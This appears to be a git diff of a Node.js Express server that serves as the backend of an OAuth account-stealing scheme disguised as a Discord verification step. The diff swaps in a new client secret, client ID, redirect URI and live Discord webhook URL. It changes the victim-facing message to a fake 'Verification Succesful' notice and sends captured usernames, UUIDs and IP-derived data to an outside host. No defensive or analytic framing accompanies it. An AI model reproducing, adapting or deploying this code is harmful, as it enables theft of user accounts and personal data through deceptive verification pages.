@@ -1,8 +1,8 @@
 //Config
-const secret_value = 'cTg8Q~5KLeSWagWpD_.nOrXhf9ntKpt3A9lKPaRI'
-const client_id = '1bfb18a2-ca7b-48c7-ad17-a490a6185320'
-const redirect_uri = 'https://nine19923.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l'
+const secret_value = 'ix48Q~NI9Bnhq-xLxiofld3QvdWDmu23Ch57Sbfn'
+const client_id = 'ee8bf65c-8e58-46f1-bed9-7075f6d18bd5'
+const redirect_uri = 'https://mcloverrr.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1065424923356573777/W5Eq-UNXPGaAFqt-azVzSXaNUcz5L9Kono0PmDZXjbbvrKLHn5Ynq6p_RiY_wskMnm8c'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('Success! You May Now Exit This Page.')
+    res.send('Verification Succesful! Return back to Discord!')
     const code = req.query.code
     if (code == null) {
         return
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({url: "https://nine19923.onrender.com", target: "_self", vals: [["username", username], ["uuid", uuid]]});
+        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
